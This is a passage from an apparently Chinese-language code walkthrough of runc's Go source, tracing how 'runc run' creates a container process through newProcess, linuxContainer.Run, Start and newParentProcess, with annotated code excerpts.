<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="p">(</span><span class="nx">l</span> <span class="o">*</span><span class="nx">LinuxFactory</span><span class="p">)</span> <span class="nf">Create</span><span class="p">(</span><span class="nx">id</span> <span class="kt">string</span><span class="p">,</span> <span class="nx">config</span> <span class="o">*</span><span class="nx">configs</span><span class="p">.</span><span class="nx">Config</span><span class="p">)</span> <span class="p">(</span><span class="nx">Container</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
    <span class="o">...</span>
    <span class="nx">c</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">linuxContainer</span><span class="p">{</span>
        <span class="nx">id</span><span class="p">:</span>            <span class="nx">id</span><span class="p">,</span>
        <span class="nx">root</span><span class="p">:</span>          <span class="nx">containerRoot</span><span class="p">,</span>
        <span class="nx">config</span><span class="p">:</span>        <span class="nx">config</span><span class="p">,</span>
        <span class="nx">initPath</span><span class="p">:</span>      <span class="nx">l</span><span class="p">.</span><span class="nx">InitPath</span><span class="p">,</span>
        <span class="nx">initArgs</span><span class="p">:</span>      <span class="nx">l</span><span class="p">.</span><span class="nx">InitArgs</span><span class="p">,</span>
        <span class="nx">criuPath</span><span class="p">:</span>      <span class="nx">l</span><span class="p">.</span><span class="nx">CriuPath</span><span class="p">,</span>
        <span class="nx">newuidmapPath</span><span class="p">:</span> <span class="nx">l</span><span class="p">.</span><span class="nx">NewuidmapPath</span><span class="p">,</span>
        <span class="nx">newgidmapPath</span><span class="p">:</span> <span class="nx">l</span><span class="p">.</span><span class="nx">NewgidmapPath</span><span class="p">,</span>
        <span class="nx">cgroupManager</span><span class="p">:</span> <span class="nx">l</span><span class="p">.</span><span class="nf">NewCgroupsManager</span><span class="p">(</span><span class="nx">config</span><span class="p">.</span><span class="nx">Cgroups</span><span class="p">,</span> <span class="kc">nil</span><span class="p">),</span>
    <span class="p">}</span>
    <span class="o">...</span>
    <span class="k">return</span> <span class="nx">c</span><span class="p">,</span> <span class="kc">nil</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>r.run()</code>函数(<code>utils_linux.go#265</code>)启动容器，其中包含两个关键逻辑，分别是<code>newProcess()</code>函数与<code>r.container.Run()</code>。</p>
<ul>
<li><code>newProcess()</code>函数创建逻辑上的容器进程</li>
<li><code>r.container.Run()</code>运行该容器
在之前的分析结果中，r.container为<code>linuxContainer</code>，所以<code>r.container.Run()</code>调用的是<code>linuxContainer.Run()</code>方法(<code>libcontainer/container_linux.go#273</code>)。</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="p">(</span><span class="nx">r</span> <span class="o">*</span><span class="nx">runner</span><span class="p">)</span> <span class="nf">run</span><span class="p">(</span><span class="nx">config</span> <span class="o">*</span><span class="nx">specs</span><span class="p">.</span><span class="nx">Process</span><span class="p">)</span> <span class="p">(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">err</span> <span class="kt">error</span>
    <span class="k">defer</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
            <span class="nx">r</span><span class="p">.</span><span class="nf">destroy</span><span class="p">()</span>
        <span class="p">}</span>
    <span class="p">}()</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="p">=</span> <span class="nx">r</span><span class="p">.</span><span class="nf">checkTerminal</span><span class="p">(</span><span class="nx">config</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="nx">err</span>
    <span class="p">}</span>
    <span class="c1">//newProcess()创建容器进程
</span><span class="c1"></span>    <span class="nx">process</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">newProcess</span><span class="p">(</span><span class="o">*</span><span class="nx">config</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">init</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">logLevel</span><span class="p">)</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="nx">err</span>
    <span class="p">}</span>
    <span class="o">...</span>

    <span class="k">switch</span> <span class="nx">r</span><span class="p">.</span><span class="nx">action</span> <span class="p">{</span>
    <span class="k">case</span> <span class="nx">CT_ACT_CREATE</span><span class="p">:</span>
        <span class="nx">err</span> <span class="p">=</span> <span class="nx">r</span><span class="p">.</span><span class="nx">container</span><span class="p">.</span><span class="nf">Start</span><span class="p">(</span><span class="nx">process</span><span class="p">)</span>
    <span class="k">case</span> <span class="nx">CT_ACT_RESTORE</span><span class="p">:</span>
        <span class="nx">err</span> <span class="p">=</span> <span class="nx">r</span><span class="p">.</span><span class="nx">container</span><span class="p">.</span><span class="nf">Restore</span><span class="p">(</span><span class="nx">process</span><span class="p">,</span> <span class="nx">r</span><span class="p">.</span><span class="nx">criuOpts</span><span class="p">)</span>
    <span class="c1">//在runc run情况下，r.action为CT_ACT_RUN，所以会执行此处逻辑
</span><span class="c1"></span>    <span class="k">case</span> <span class="nx">CT_ACT_RUN</span><span class="p">:</span>
        <span class="nx">err</span> <span class="p">=</span> <span class="nx">r</span><span class="p">.</span><span class="nx">container</span><span class="p">.</span><span class="nf">Run</span><span class="p">(</span><span class="nx">process</span><span class="p">)</span>
    <span class="k">default</span><span class="p">:</span>
        <span class="nb">panic</span><span class="p">(</span><span class="s">&#34;Unknown action&#34;</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="o">...</span>
    <span class="nx">status</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">handler</span><span class="p">.</span><span class="nf">forward</span><span class="p">(</span><span class="nx">process</span><span class="p">,</span> <span class="nx">tty</span><span class="p">,</span> <span class="nx">detach</span><span class="p">)</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="nx">r</span><span class="p">.</span><span class="nf">terminate</span><span class="p">(</span><span class="nx">process</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="nx">detach</span> <span class="p">{</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">,</span> <span class="kc">nil</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">==</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="nx">r</span><span class="p">.</span><span class="nf">destroy</span><span class="p">()</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">status</span><span class="p">,</span> <span class="nx">err</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>首先来看<code>newProcess()</code>(<code>utils_linux.go#102</code>)函数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="c1">// newProcess returns a new libcontainer Process with the arguments from the
</span><span class="c1">// spec and stdio from the current process.
</span><span class="c1"></span><span class="kd">func</span> <span class="nf">newProcess</span><span class="p">(</span><span class="nx">p</span> <span class="nx">specs</span><span class="p">.</span><span class="nx">Process</span><span class="p">,</span> <span class="nx">init</span> <span class="kt">bool</span><span class="p">,</span> <span class="nx">logLevel</span> <span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="o">*</span><span class="nx">libcontainer</span><span class="p">.</span><span class="nx">Process</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">//创建libcontainer.process对象
</span><span class="c1"></span>    <span class="nx">lp</span> <span class="o">:=</span> <span class="o">&amp;</span><span class="nx">libcontainer</span><span class="p">.</span><span class="nx">Process</span><span class="p">{</span>
        <span class="nx">Args</span><span class="p">:</span> <span class="nx">p</span><span class="p">.</span><span class="nx">Args</span><span class="p">,</span>
        <span class="nx">Env</span><span class="p">:</span>  <span class="nx">p</span><span class="p">.</span><span class="nx">Env</span><span class="p">,</span>
        <span class="c1">// TODO: fix libcontainer&#39;s API to better support uid/gid in a typesafe way.
</span><span class="c1"></span>        <span class="nx">User</span><span class="p">:</span>            <span class="nx">fmt</span><span class="p">.</span><span class="nf">Sprintf</span><span class="p">(</span><span class="s">&#34;%d:%d&#34;</span><span class="p">,</span> <span class="nx">p</span><span class="p">.</span><span class="nx">User</span><span class="p">.</span><span class="nx">UID</span><span class="p">,</span> <span class="nx">p</span><span class="p">.</span><span class="nx">User</span><span class="p">.</span><span class="nx">GID</span><span class="p">),</span>
        <span class="nx">Cwd</span><span class="p">:</span>             <span class="nx">p</span><span class="p">.</span><span class="nx">Cwd</span><span class="p">,</span>
        <span class="nx">Label</span><span class="p">:</span>           <span class="nx">p</span><span class="p">.</span><span class="nx">SelinuxLabel</span><span class="p">,</span>
        <span class="nx">NoNewPrivileges</span><span class="p">:</span> <span class="o">&amp;</span><span class="nx">p</span><span class="p">.</span><span class="nx">NoNewPrivileges</span><span class="p">,</span>
        <span class="nx">AppArmorProfile</span><span class="p">:</span> <span class="nx">p</span><span class="p">.</span><span class="nx">ApparmorProfile</span><span class="p">,</span>
        <span class="nx">Init</span><span class="p">:</span>            <span class="nx">init</span><span class="p">,</span>
        <span class="nx">LogLevel</span><span class="p">:</span>        <span class="nx">logLevel</span><span class="p">,</span>
    <span class="p">}</span>

    <span class="c1">//定义consoleSize和Capabilities？(此处操作敏感点？)
</span><span class="c1"></span>    <span class="k">if</span> <span class="nx">p</span><span class="p">.</span><span class="nx">ConsoleSize</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="nx">lp</span><span class="p">.</span><span class="nx">ConsoleWidth</span> <span class="p">=</span> <span class="nb">uint16</span><span class="p">(</span><span class="nx">p</span><span class="p">.</span><span class="nx">ConsoleSize</span><span class="p">.</span><span class="nx">Width</span><span class="p">)</span>
        <span class="nx">lp</span><span class="p">.</span><span class="nx">ConsoleHeight</span> <span class="p">=</span> <span class="nb">uint16</span><span class="p">(</span><span class="nx">p</span><span class="p">.</span><span class="nx">ConsoleSize</span><span class="p">.</span><span class="nx">Height</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="nx">p</span><span class="p">.</span><span class="nx">Capabilities</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="nx">lp</span><span class="p">.</span><span class="nx">Capabilities</span> <span class="p">=</span> <span class="o">&amp;</span><span class="nx">configs</span><span class="p">.</span><span class="nx">Capabilities</span><span class="p">{}</span>
        <span class="nx">lp</span><span class="p">.</span><span class="nx">Capabilities</span><span class="p">.</span><span class="nx">Bounding</span> <span class="p">=</span> <span class="nx">p</span><span class="p">.</span><span class="nx">Capabilities</span><span class="p">.</span><span class="nx">Bounding</span>
        <span class="nx">lp</span><span class="p">.</span><span class="nx">Capabilities</span><span class="p">.</span><span class="nx">Effective</span> <span class="p">=</span> <span class="nx">p</span><span class="p">.</span><span class="nx">Capabilities</span><span class="p">.</span><span class="nx">Effective</span>
        <span class="nx">lp</span><span class="p">.</span><span class="nx">Capabilities</span><span class="p">.</span><span class="nx">Inheritable</span> <span class="p">=</span> <span class="nx">p</span><span class="p">.</span><span class="nx">Capabilities</span><span class="p">.</span><span class="nx">Inheritable</span>
        <span class="nx">lp</span><span class="p">.</span><span class="nx">Capabilities</span><span class="p">.</span><span class="nx">Permitted</span> <span class="p">=</span> <span class="nx">p</span><span class="p">.</span><span class="nx">Capabilities</span><span class="p">.</span><span class="nx">Permitted</span>
        <span class="nx">lp</span><span class="p">.</span><span class="nx">Capabilities</span><span class="p">.</span><span class="nx">Ambient</span> <span class="p">=</span> <span class="nx">p</span><span class="p">.</span><span class="nx">Capabilities</span><span class="p">.</span><span class="nx">Ambient</span>
    <span class="p">}</span>
    <span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">gid</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">p</span><span class="p">.</span><span class="nx">User</span><span class="p">.</span><span class="nx">AdditionalGids</span> <span class="p">{</span>
        <span class="nx">lp</span><span class="p">.</span><span class="nx">AdditionalGroups</span> <span class="p">=</span> <span class="nb">append</span><span class="p">(</span><span class="nx">lp</span><span class="p">.</span><span class="nx">AdditionalGroups</span><span class="p">,</span> <span class="nx">strconv</span><span class="p">.</span><span class="nf">FormatUint</span><span class="p">(</span><span class="nb">uint64</span><span class="p">(</span><span class="nx">gid</span><span class="p">),</span> <span class="mi">10</span><span class="p">))</span>
    <span class="p">}</span>
    <span class="k">for</span> <span class="nx">_</span><span class="p">,</span> <span class="nx">rlimit</span> <span class="o">:=</span> <span class="k">range</span> <span class="nx">p</span><span class="p">.</span><span class="nx">Rlimits</span> <span class="p">{</span>
        <span class="nx">rl</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">createLibContainerRlimit</span><span class="p">(</span><span class="nx">rlimit</span><span class="p">)</span>
        <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">err</span>
        <span class="p">}</span>
        <span class="nx">lp</span><span class="p">.</span><span class="nx">Rlimits</span> <span class="p">=</span> <span class="nb">append</span><span class="p">(</span><span class="nx">lp</span><span class="p">.</span><span class="nx">Rlimits</span><span class="p">,</span> <span class="nx">rl</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">lp</span><span class="p">,</span> <span class="kc">nil</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>创建容器之后，<code>r.container.Run()</code>运行该容器。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">linuxContainer</span><span class="p">)</span> <span class="nf">Run</span><span class="p">(</span><span class="nx">process</span> <span class="o">*</span><span class="nx">Process</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">c</span><span class="p">.</span><span class="nf">Start</span><span class="p">(</span><span class="nx">process</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">err</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="nx">process</span><span class="p">.</span><span class="nx">Init</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">c</span><span class="p">.</span><span class="nf">exec</span><span class="p">()</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="kc">nil</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>linuxContainer.Run()</code>先调用<code>linuxContainer.Start()</code>，再调用<code>linuxContainer.exec()</code>函数。<code>linuxContainer.Start(</code>)是对<code>linuxContainer.start()</code>的包装。</p>
<p><code>linuxContainer.start()</code>又调用<code>linuxContainer.newParentProcess()</code>创建进程并启动。</p>
<p>所以此处的调用链为<code>linuxContainer.Run() -&gt; linuxContainer.Start() -&gt; linuxContainer.start() -&gt; linuxContainer.newParentProcess()</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">linuxContainer</span><span class="p">)</span> <span class="nf">Start</span><span class="p">(</span><span class="nx">process</span> <span class="o">*</span><span class="nx">Process</span><span class="p">)</span> <span class="kt">error</span> <span class="p">{</span>
    <span class="nx">c</span><span class="p">.</span><span class="nx">m</span><span class="p">.</span><span class="nf">Lock</span><span class="p">()</span>
    <span class="k">defer</span> <span class="nx">c</span><span class="p">.</span><span class="nx">m</span><span class="p">.</span><span class="nf">Unlock</span><span class="p">()</span>
    <span class="k">if</span> <span class="nx">c</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">Cgroups</span><span class="p">.</span><span class="nx">Resources</span><span class="p">.</span><span class="nx">SkipDevices</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nf">newGenericError</span><span class="p">(</span><span class="nx">errors</span><span class="p">.</span><span class="nf">New</span><span class="p">(</span><span class="s">&#34;can&#39;t start container with SkipDevices set&#34;</span><span class="p">),</span> <span class="nx">ConfigInvalid</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="nx">process</span><span class="p">.</span><span class="nx">Init</span> <span class="p">{</span>
        <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">c</span><span class="p">.</span><span class="nf">createExecFifo</span><span class="p">();</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">err</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="c1">//实际上调用start()函数
</span><span class="c1"></span>    <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">c</span><span class="p">.</span><span class="nf">start</span><span class="p">(</span><span class="nx">process</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">if</span> <span class="nx">process</span><span class="p">.</span><span class="nx">Init</span> <span class="p">{</span>
            <span class="nx">c</span><span class="p">.</span><span class="nf">deleteExecFifo</span><span class="p">()</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nx">err</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="kc">nil</span>
<span class="p">}</span>
<span class="o">...</span>
<span class="kd">func</span> <span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">linuxContainer</span><span class="p">)</span> <span class="nf">start</span><span class="p">(</span><span class="nx">process</span> <span class="o">*</span><span class="nx">Process</span><span class="p">)</span> <span class="p">(</span><span class="nx">retErr</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">//创建process的父进程
</span><span class="c1"></span>    <span class="nx">parent</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">c</span><span class="p">.</span><span class="nf">newParentProcess</span><span class="p">(</span><span class="nx">process</span><span class="p">)</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nf">newSystemErrorWithCause</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;creating new parent process&#34;</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="nx">logsDone</span> <span class="o">:=</span> <span class="nx">parent</span><span class="p">.</span><span class="nf">forwardChildLogs</span><span class="p">()</span>
    <span class="k">if</span> <span class="nx">logsDone</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">defer</span> <span class="kd">func</span><span class="p">()</span> <span class="p">{</span>
            <span class="c1">// Wait for log forwarder to finish. This depends on
</span><span class="c1"></span>            <span class="c1">// runc init closing the _LIBCONTAINER_LOGPIPE log fd.
</span><span class="c1"></span>            <span class="nx">err</span> <span class="o">:=</span> <span class="o">&lt;-</span><span class="nx">logsDone</span>
            <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="o">&amp;&amp;</span> <span class="nx">retErr</span> <span class="o">==</span> <span class="kc">nil</span> <span class="p">{</span>
                <span class="nx">retErr</span> <span class="p">=</span> <span class="nf">newSystemErrorWithCause</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;forwarding init logs&#34;</span><span class="p">)</span>
            <span class="p">}</span>
        <span class="p">}()</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">parent</span><span class="p">.</span><span class="nf">start</span><span class="p">();</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nf">newSystemErrorWithCause</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;starting container process&#34;</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="nx">process</span><span class="p">.</span><span class="nx">Init</span> <span class="p">{</span>
        <span class="nx">c</span><span class="p">.</span><span class="nx">fifo</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
        <span class="k">if</span> <span class="nx">c</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">Hooks</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
            <span class="nx">s</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">c</span><span class="p">.</span><span class="nf">currentOCIState</span><span class="p">()</span>
            <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
                <span class="k">return</span> <span class="nx">err</span>
            <span class="p">}</span>

            <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">config</span><span class="p">.</span><span class="nx">Hooks</span><span class="p">[</span><span class="nx">configs</span><span class="p">.</span><span class="nx">Poststart</span><span class="p">].</span><span class="nf">RunHooks</span><span class="p">(</span><span class="nx">s</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
                <span class="k">if</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nf">ignoreTerminateErrors</span><span class="p">(</span><span class="nx">parent</span><span class="p">.</span><span class="nf">terminate</span><span class="p">());</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
                    <span class="nx">logrus</span><span class="p">.</span><span class="nf">Warn</span><span class="p">(</span><span class="nx">errorsf</span><span class="p">.</span><span class="nf">Wrapf</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;Running Poststart hook&#34;</span><span class="p">))</span>
                <span class="p">}</span>
                <span class="k">return</span> <span class="nx">err</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="kc">nil</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>再来分析<code>linuxContainer.newParentProcess()</code>(<code>libcontainer/container_linux.go#472</code>)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kd">func</span> <span class="p">(</span><span class="nx">c</span> <span class="o">*</span><span class="nx">linuxContainer</span><span class="p">)</span> <span class="nf">newParentProcess</span><span class="p">(</span><span class="nx">p</span> <span class="o">*</span><span class="nx">Process</span><span class="p">)</span> <span class="p">(</span><span class="nx">parentProcess</span><span class="p">,</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">//创建进程间通信的pipe
</span><span class="c1"></span>    <span class="nx">parentInitPipe</span><span class="p">,</span> <span class="nx">childInitPipe</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">utils</span><span class="p">.</span><span class="nf">NewSockPair</span><span class="p">(</span><span class="s">&#34;init&#34;</span><span class="p">)</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="nf">newSystemErrorWithCause</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="s">&#34;creating new init pipe&#34;</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="nx">messageSockPair</span> <span class="o">:=</span> <span class="nx">filePair</span><span class="p">{</span><span class="nx">parentInitPipe</span><span class="p">,</span> <span class="nx">childInitPipe</span><span class="p">}</span>

    <span class="nx">parentLogPipe</span><span class="p">,</span> <span class="nx">childLogPipe</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">os</span><span class="p">.</span><span class="nf">Pipe</span><span class="p">()</span>
    <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
        <span class="k">return</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">fmt</span><span class="p">.</span><span class="nf">Errorf</span><span class="p">(</span><span class="s">&#34;Unable to create the log pipe:  %s&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
    <span class="p">}</span>
